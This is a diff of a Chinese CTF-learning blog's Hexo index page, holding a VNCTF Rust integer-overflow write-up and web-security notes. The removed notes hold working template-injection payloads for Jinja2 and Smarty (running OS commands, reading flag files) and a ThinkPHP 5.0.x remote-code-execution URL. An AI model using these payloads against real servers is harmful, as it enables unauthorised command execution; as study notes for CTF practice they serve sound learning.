-<p>也就是说例如：<code>&#123;&#123;&#125;&#125;</code>在Jinja2中作为变量包裹标识符，Jinja2在渲染的时候会把<code>&#123;&#123;&#125;&#125;</code>包裹的内容当做变量解析替换。比如<code>&#123;&#123;1+1&#125;&#125;</code>会被解析成2。如此一来就可以实现如同sql注入一样的注入漏洞。</p>
-<h3 id="判断SSTI类型"><a href="#判断SSTI类型" class="headerlink" title="判断SSTI类型"></a>判断SSTI类型</h3><p><img src="/blog/2023/02/28/Web%E7%AC%94%E8%AE%B0/image-20221209231042495.png" alt="image-20221209231042495"></p>
-<h3 id="类-1"><a href="#类-1" class="headerlink" title="类"></a>类</h3><p><code>&#123;&#123;config.__class__.__init__.__globals__['os'].popen('命令').read()&#125;&#125;</code></p>
-<h3 id="Smarty"><a href="#Smarty" class="headerlink" title="Smarty"></a>Smarty</h3><p><code>X-Forwarded-For:&#123;if system(&#39;cat /f*&#39;)&#125;&#123;/if&#125;</code></p>
-<h1 id="模板漏洞"><a href="#模板漏洞" class="headerlink" title="模板漏洞"></a>模板漏洞</h1><h2 id="ThinkPHP"><a href="#ThinkPHP" class="headerlink" title="ThinkPHP"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/yangbz123/article/details/115329314?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167748807816782425179087%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167748807816782425179087&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-115329314-null-null.142%5Ev73%5Einsert_down1,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&utm_term=thinkphp%E6%BC%8F%E6%B4%9E&spm=1018.2226.3001.4187">ThinkPHP</a></h2><h3 id="5-0-x"><a href="#5-0-x" class="headerlink" title="5.0.x"></a>5.0.x</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/thinkphp_5.0.21/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://c1oudflowing.github.io/blog/2023/02/26/VNCTF-GongDe/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/blog/images/avatar.gif">
-      <meta itemprop="name" content="CloudFlowing">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Blog,from C1oudFLowing">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/blog/2023/02/26/VNCTF-GongDe/" class="post-title-link" itemprop="url">VNCTF GongDe</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-02-26 21:55:22" itemprop="dateCreated datePublished" datetime="2023-02-26T21:55:22+08:00">2023-02-26</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-03-02 19:36:17" itemprop="dateModified" datetime="2023-03-02T19:36:17+08:00">2023-03-02</time>
-              </span>
-
-          
-
+<p>南森</p>
+            
         </div>
-      </header>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        <span class="tag">
+            
+            <a href="/blog/tags/%E5%AD%A6%E4%B9%A0/" style="color: #ff7d73">
+                学习
+            </a>
+        </span>
+        
+    </div>
+    <a href="/blog/2023/02/28/Web%E7%AC%94%E8%AE%B0/" class="go-post">阅读全文</a>
+</div>
 
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="电子木鱼"><a href="#电子木鱼" class="headerlink" title="电子木鱼"></a>电子木鱼</h1><blockquote>
+<div class="post">
+    <a href="/blog/2023/02/26/VNCTF-GongDe/">
+        <h2 class="post-title">VNCTF GongDe</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/2/26
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="电子木鱼"><a href="#电子木鱼" class="headerlink" title="电子木鱼"></a>电子木鱼</h1><blockquote>
 <p>RUST文件代码审计</p>
 <p>整数溢出</p>
 </blockquote>
-<h2 id="分析代码结构（main-rs）"><a href="#分析代码结构（main-rs）" class="headerlink" title="分析代码结构（main.rs）"></a>分析代码结构（main.rs）</h2><h3 id="初始页面及-每次修改后都要返回此页面查看数值"><a href="#初始页面及-每次修改后都要返回此页面查看数值" class="headerlink" title="初始页面及(每次修改后都要返回此页面查看数值)"></a>初始页面及(每次修改后都要返回此页面查看数值)</h3><p><img src="C:\Users\Asus\Desktop\hexo\source_posts\image-20230226221223336.png" alt="image-20230226221223336"></p>
-<h3 id="此段得知获取flag的条件"><a href="#此段得知获取flag的条件" class="headerlink" title="此段得知获取flag的条件"></a>此段得知获取flag的条件</h3><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[get(<span class="string">&quot;/&quot;</span>)]</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">index</span>(tera: web::Data&lt;Tera&gt;) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;HttpResponse, Error&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">context</span> = Context::<span class="title function_ invoke__">new</span>();</span><br><span class="line"></span><br><span class="line">    context.<span class="title function_ invoke__">insert</span>(<span class="string">&quot;gongde&quot;</span>, &amp;GONGDE.<span class="title function_ invoke__">get</span>());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> GONGDE.<span class="title function_ invoke__">get</span>() &gt; <span class="number">1_000_000_000</span> &#123;	<span class="comment">//GONGDE大于1_000_000_000即可获取flag</span></span><br><span class="line">        context.<span class="title function_ invoke__">insert</span>(</span><br><span class="line">            <span class="string">&quot;flag&quot;</span>,</span><br><span class="line">            &amp;std::env::<span class="title function_ invoke__">var</span>(<span class="string">&quot;FLAG&quot;</span>).<span class="title function_ invoke__">unwrap_or_else</span>(|_| <span class="string">&quot;flag&#123;test_flag&#125;&quot;</span>.<span class="title function_ invoke__">to_string</span>()),</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">match</span> tera.<span class="title function_ invoke__">render</span>(<span class="string">&quot;index.html&quot;</span>, &amp;context) &#123;</span><br><span class="line">        <span class="title function_ invoke__">Ok</span>(body) =&gt; <span class="title function_ invoke__">Ok</span>(HttpResponse::<span class="title function_ invoke__">Ok</span>().<span class="title function_ invoke__">body</span>(body)),</span><br><span class="line">        <span class="title function_ invoke__">Err</span>(err) =&gt; <span class="title function_ invoke__">Err</span>(error::<span class="title function_ invoke__">ErrorInternalServerError</span>(err)),</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<hr>
-<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">APIResult</span> &#123;</span><br><span class="line">    success: <span class="type">bool</span>,</span><br><span class="line">    message: &amp;<span class="symbol">&#x27;static</span> <span class="type">str</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[derive(Deserialize)]</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Info</span> &#123;</span><br><span class="line">    name: <span class="type">String</span>,</span><br><span class="line">    quantity: <span class="type">i32</span>,<span class="comment">//定义quantity为i32类型的有符号整数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[derive(Debug, Copy, Clone, Serialize)]</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Payload</span> &#123;</span><br><span class="line">    name: &amp;<span class="symbol">&#x27;static</span> <span class="type">str</span>,</span><br><span class="line">    cost: <span class="type">i32</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>定义类及参数</p>
-<hr>
-<h3 id="定义name-选项-及其Cost-花费的功德"><a href="#定义name-选项-及其Cost-花费的功德" class="headerlink" title="定义name(选项)及其Cost(花费的功德)"></a>定义<code>name</code>(选项)及其<code>Cost</code>(花费的功德)</h3><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> PAYLOADS: &amp;[Payload] = &amp;[</span><br><span class="line">    Payload &#123;</span><br><span class="line">        name: <span class="string">&quot;Cost&quot;</span>,</span><br><span class="line">        cost: <span class="number">10</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    Payload &#123;</span><br><span class="line">        name: <span class="string">&quot;Loan&quot;</span>,</span><br><span class="line">        cost: -<span class="number">1_000</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    Payload &#123;</span><br><span class="line">        name: <span class="string">&quot;CCCCCost&quot;</span>,</span><br><span class="line">        cost: <span class="number">500</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    Payload &#123;</span><br><span class="line">        name: <span class="string">&quot;Donate&quot;</span>,</span><br><span class="line">        cost: <span class="number">1</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    Payload &#123;</span><br><span class="line">        name: <span class="string">&quot;Sleep&quot;</span>,</span><br><span class="line">        cost: <span class="number">0</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">];</span><br></pre></td></tr></table></figure>
-
-
-
-<hr>
-<h3 id="主要判断部分"><a href="#主要判断部分" class="headerlink" title="主要判断部分"></a>主要判断部分</h3><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[post(<span class="string">&quot;/upgrade&quot;</span>)]</span>		<span class="comment">//此段说明在/upgrade中传参方式为POST</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">upgrade</span>(body: web::Form&lt;Info&gt;) <span class="punctuation">-&gt;</span> Json&lt;APIResult&gt; &#123;	<span class="comment">//从Info中获取参数名</span></span><br><span class="line">    <span class="keyword">if</span> GONGDE.<span class="title function_ invoke__">get</span>() &lt; <span class="number">0</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> web::<span class="title function_ invoke__">Json</span>(APIResult &#123;</span><br><span class="line">            success: <span class="literal">false</span>,</span><br><span class="line">            message: <span class="string">&quot;功德都搞成负数了，佛祖对你很失望&quot;</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> body.quantity &lt;= <span class="number">0</span> &#123;		<span class="comment">//禁止传入小于等于0的数</span></span><br><span class="line">        <span class="keyword">return</span> web::<span class="title function_ invoke__">Json</span>(APIResult &#123;</span><br><span class="line">            success: <span class="literal">false</span>,</span><br><span class="line">            message: <span class="string">&quot;佛祖面前都敢作弊，真不怕遭报应啊&quot;</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Some</span>(payload) = PAYLOADS.<span class="title function_ invoke__">iter</span>().<span class="title function_ invoke__">find</span>(|u| u.name == body.name) &#123;		<span class="comment">//根据传入name的类型进入不同分支</span></span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">cost</span> = payload.cost;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> payload.name == <span class="string">&quot;Donate&quot;</span> || payload.name == <span class="string">&quot;Cost&quot;</span> &#123;</span><br><span class="line">            cost *= body.quantity;		<span class="comment">//在 name 参数为 Donate 或Cost 的时候会将原本的功德消耗值乘上我们传入的 </span></span><br><span class="line">        &#125;								<span class="comment">//quantity参数值计算功德消耗</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> GONGDE.<span class="title function_ invoke__">get</span>() &lt; cost <span class="keyword">as</span> <span class="type">i32</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> web::<span class="title function_ invoke__">Json</span>(APIResult &#123;</span><br><span class="line">                success: <span class="literal">false</span>,</span><br><span class="line">                message: <span class="string">&quot;功德不足&quot;</span>,</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> cost != <span class="number">0</span> &#123;</span><br><span class="line">            GONGDE.<span class="title function_ invoke__">set</span>(GONGDE.<span class="title function_ invoke__">get</span>() - cost <span class="keyword">as</span> <span class="type">i32</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> payload.name == <span class="string">&quot;Cost&quot;</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> web::<span class="title function_ invoke__">Json</span>(APIResult &#123;</span><br><span class="line">                success: <span class="literal">true</span>,</span><br><span class="line">                message: <span class="string">&quot;小扣一手功德&quot;</span>,</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> payload.name == <span class="string">&quot;CCCCCost&quot;</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> web::<span class="title function_ invoke__">Json</span>(APIResult &#123;</span><br><span class="line">                success: <span class="literal">true</span>,</span><br><span class="line">                message: <span class="string">&quot;功德都快扣没了，怎么睡得着的&quot;</span>,</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> payload.name == <span class="string">&quot;Loan&quot;</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> web::<span class="title function_ invoke__">Json</span>(APIResult &#123;</span><br><span class="line">                success: <span class="literal">true</span>,</span><br><span class="line">                message: <span class="string">&quot;我向佛祖许愿，佛祖借我功德，快说谢谢佛祖&quot;</span>,</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> payload.name == <span class="string">&quot;Donate&quot;</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> web::<span class="title function_ invoke__">Json</span>(APIResult &#123;</span><br><span class="line">                success: <span class="literal">true</span>,</span><br><span class="line">                message: <span class="string">&quot;好人有好报&quot;</span>,</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> payload.name == <span class="string">&quot;Sleep&quot;</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> web::<span class="title function_ invoke__">Json</span>(APIResult &#123;</span><br><span class="line">                success: <span class="literal">true</span>,</span><br><span class="line">                message: <span class="string">&quot;这是什么？床，睡一下&quot;</span>,</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    web::<span class="title function_ invoke__">Json</span>(APIResult &#123;</span><br><span class="line">        success: <span class="literal">false</span>,</span><br><span class="line">        message: <span class="string">&quot;禁止开摆&quot;</span>,</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>返回均为json页面</li>
-</ul>
-<hr>
-<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ul>
-<li>在 <code>name</code> 参数为 <code>Donate </code>或<code>Cost</code> 的时候会将原本的功德消耗值乘上我们传入的 <code>quantity</code> 参数值计算功德消耗</li>
-<li>但是唯一能使功德增加的 <code>Loan</code> 选项并没有出现在此分支的条件判断中，因此无法直接正向增加功德一步到位。正向的路基本被堵死</li>
-<li>同时我们也注意到 <code>cost</code> 变量为 <code>i32 有符号整数</code>，上限为<strong>2,147,483,647</strong>，当我们要<strong>扣的功德足够大时就会造成溢出，得到一个绝对值非常大的负数</strong>。再加上并没有设置对 <code>quantity </code>参数的限制，办到这一点还是不难的。</li>
-</ul>
-<hr>
-<h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><p><img src="/blog/2023/02/26/VNCTF-GongDe/image-20230226221223336.png" alt="image-20230226221223336"></p>
-<ul>
-<li>在upgrade中发出请求使功德扣至溢出</li>
-</ul>
-<p><img src="/blog/2023/02/26/VNCTF-GongDe/image-20230226224920856.png" alt="image-20230226224920856"></p>
-<ul>
-<li>返回页面获取flag</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://c1oudflowing.github.io/blog/2023/02/10/hello-world/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/blog/images/avatar.gif">
-      <meta itemprop="name" content="CloudFlowing">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Blog,from C1oudFLowing">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/blog/2023/02/10/hello-world/" class="post-title-link" itemprop="url">Hello World</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-02-10 22:04:25" itemprop="dateCreated datePublished" datetime="2023-02-10T22:04:25+08:00">2023-02-10</time>
-            </span>
-
-          
-
+            
         </div>
-      </header>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        <span class="tag">
+            
+            <a href="/blog/tags/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="color: #ffa2c4">
+                CTF线上赛
+            </a>
+        </span>
+        
+    </div>
+    <a href="/blog/2023/02/26/VNCTF-GongDe/" class="go-post">阅读全文</a>
+</div>
 
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
+<div class="post">
+    <a href="/blog/2023/02/10/hello-world/">
+        <h2 class="post-title">Hello World</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/2/10
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre><code class="bash">$ hexo new &quot;My New Post&quot;
+</code></pre>
 <p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre><code class="bash">$ hexo server
+</code></pre>
 <p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre><code class="bash">$ hexo generate
+</code></pre>
 <p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre><code class="bash">$ hexo deploy
+</code></pre>
 <p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
 
-      
+            
+        </div>
     </div>
+    <div class="post-tags">
+        
+        
+    </div>
+    <a href="/blog/2023/02/10/hello-world/" class="go-post">阅读全文</a>
+</div>
 
+
+            <div class="page-current">
+    <div class="prev">
+        
+    </div>
+    <div class="page-index">
+        
+        <span class="current">1</span>
+        
+    </div>
+    <div class="next">
+        
+    </div>
+</div>
+
+        </div>
+    </div>
     
+    <div id="home-card">
+        <div id="card-div">
+    <div class="card-style" style="width: 300px">
+        <div class="avatar">
+            <img src="/blog/images/croppedImage_cropped.jpg" alt="avatar" />
+        </div>
+        <div class="name">CloudFlowing</div>
+        <div class="description">
+            <p>Default<br>NULL</p>
+
+        </div>
+        
+        
+        <div class="friend-links">
+            
+            <div class="friend-link">
+                <a target="_blank" rel="noopener" href="http://floating-ocean.github.io/blog/a/cf_828">Floating-Ocean</a>
+            </div>
+            
+        </div>
+        
+    </div>
+</div>
+
+    </div>
     
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
+</div>
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://c1oudflowing.github.io/blog/2023/02/10/test/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/blog/images/avatar.gif">
-      <meta itemprop="name" content="CloudFlowing">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Blog,from C1oudFLowing">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/blog/2023/02/10/test/" class="post-title-link" itemprop="url">test</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2023-02-10 21:26:41 / 修改时间：22:04:25" itemprop="dateCreated datePublished" datetime="2023-02-10T21:26:41+08:00">2023-02-10</time>
+                <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2023 Blog,from C1oudFLowing
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
             </span>
-
-          
-
+            &commat;CloudFlowing
         </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-
-  
-
-
-
-          </div>
-          
-
-<script>
-  window.addEventListener('tabs:register', () => {
-    let { activeClass } = CONFIG.comments;
-    if (CONFIG.comments.storage) {
-      activeClass = localStorage.getItem('comments_active') || activeClass;
-    }
-    if (activeClass) {
-      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
-      if (activeTab) {
-        activeTab.click();
-      }
-    }
-  });
-  if (CONFIG.comments.storage) {
-    window.addEventListener('tabs:click', event => {
-      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
-      let commentClass = event.target.classList[1];
-      localStorage.setItem('comments_active', commentClass);
-    });
-  }
-</script>
-
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
         </div>
-          
-  
-  <div class="toggle sidebar-toggle">
-    <span class="toggle-line toggle-line-first"></span>
-    <span class="toggle-line toggle-line-middle"></span>
-    <span class="toggle-line toggle-line-last"></span>
-  </div>
-
-  <aside class="sidebar">
-    <div class="sidebar-inner">
-
-      <ul class="sidebar-nav motion-element">
-        <li class="sidebar-nav-toc">
-          文章目录
-        </li>
-        <li class="sidebar-nav-overview">
-          站点概览
-        </li>
-      </ul>
-
-      <!--noindex-->
-      <div class="post-toc-wrap sidebar-panel">
-      </div>
-      <!--/noindex-->
-
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-  <p class="site-author-name" itemprop="name">CloudFlowing</p>
-  <div class="site-description" itemprop="description"></div>
-</div>
-<div class="site-state-wrap motion-element">
-  <nav class="site-state">
-      <div class="site-state-item site-state-posts">
-          <a href="/blog/archives/">
         
-          <span class="site-state-item-count">6</span>
-          <span class="site-state-item-name">日志</span>
-        </a>
-      </div>
-      <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">2</span>
-        <span class="site-state-item-name">标签</span>
-      </div>
-  </nav>
-</div>
-
-
-
-      </div>
-
     </div>
-  </aside>
-  <div id="sidebar-dimmer"></div>
+</footer>
 
-
-      </div>
